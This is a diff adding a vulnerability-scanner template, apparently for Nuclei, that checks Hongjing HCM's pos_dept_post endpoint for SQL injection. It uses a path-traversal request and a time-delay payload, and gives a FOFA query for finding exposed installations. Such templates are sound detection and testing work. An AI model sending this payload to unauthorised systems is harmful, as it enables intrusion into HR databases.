@@ -1,0 +1,31 @@
+http:
+- matchers:
+  - dsl:
+    - duration>=4
+    type: dsl
+  raw:
+  - '@timeout: 10s
+
+    POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    usertable=h00&usernumber=1&i9999=-1'';WAITFOR DELAY ''0:0:4''--+
+
+    '
+id: hjsoft-hcm-pos-dept-post-sqli
+info:
+  author: Co5mos
+  description: "\u5B8F\u666FHCM pos_dept_post \u63A5\u53E3\u5B58\u5728 SQL \u6CE8\u5165\
+    \u6F0F\u6D1E\uFF0C\u7531\u4E8E\u4F20\u5165\u7684\u6570\u636E\u6CA1\u6709\u9884\
+    \u7F16\u8BD1\u548C\u5145\u8DB3\u7684\u6821\u9A8C\uFF0C\u672A\u6388\u6743\u7684\
+    \u653B\u51FB\u8005\u53EF\u5229\u7528\u8BE5\u6F0F\u6D1E\u83B7\u53D6\u6570\u636E\
+    \u5E93\u654F\u611F\u4FE1\u606F\u3002\n"
+  metadata:
+    fofa-query: app="HJSOFT-HCM"
+  name: Hongjing HCM pos_dept_post SQL Injection
+  severity: critical
+  tags: hongjing,sqli
